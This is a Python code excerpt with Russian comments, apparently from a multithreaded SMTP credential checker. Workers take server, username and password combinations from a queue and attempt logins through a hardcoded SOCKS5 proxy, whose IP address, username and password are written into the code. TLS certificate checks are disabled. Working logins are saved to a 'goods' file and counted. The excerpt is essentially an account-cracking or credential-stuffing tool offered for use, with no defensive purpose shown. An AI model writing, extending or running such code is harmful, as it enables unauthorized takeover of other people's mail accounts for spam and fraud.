...
def socket_get_free_smtp_server(smtp_server, port, proxy_host=None, proxy_port=None, proxy_username=None, proxy_password=None):
    ...
    # Настройка типа адреса (IPv4 или IPv6)
    socket_type = socket.AF_INET6 if ':' in smtp_server_ip else socket.AF_INET
    
    # Создание сокета через PySocks
    s = socks.socksocket(socket_type, socket.SOCK_STREAM)
    
    # Настройка прокси
    if proxy_host and proxy_port:
        # Указание типа прокси (SOCKS5 с авторизацией)
        s.set_proxy(
    ...
    # Настройка SSL для порта 465 (если требуется)
    s = ssl._create_unverified_context().wrap_socket(s) if port == 465 else s
    
    # Установка таймаута и подключение
    s.settimeout(5)
    try:
...
def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password, 
    ...
    # Подключение через сокет с поддержкой прокси
    s = socket_get_free_smtp_server(smtp_server, port, proxy_host, proxy_port, proxy_username, proxy_password)
...
def worker_item(jobs_que, results_que):
    global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times
    while True:
        if jobs_que.empty():
            if no_jobs_left:
                break
            else:
                results_que.put('queue exhausted, sleeping...')
                time.sleep(1)
                continue
        else:
            ...
            try:
                ...
                results_que.put(f"Connecting to {smtp_server}:{port} using {smtp_user}:{password}")

                # Передача данных прокси в функцию
                smtp_connect_and_send(
                    smtp_server, 
                    port, 
                    login_template, 
                    smtp_user, 
                    password, 
                    proxy_host="109.173.73.179",         # Укажите ваш прокси-хост
                    proxy_port=8119,                # Укажите ваш прокси-порт
                    proxy_username="rqq4xvelf",    # Укажите ваш логин прокси
                    proxy_password="cqek1qhsfq"     # Укажите ваш пароль прокси
                )

                results_que.put(f"Success: {smtp_user}:{password}")
                open(smtp_filename, 'a').write(f"{smtp_server}|{port}|{smtp_user}|{password}\n")
                goods += 1
            except Exception as e:
                results_que.put(f"Error: {smtp_server}:{port} - {str(e)}")
            time.sleep(0.04)  # Разгрузка потоков
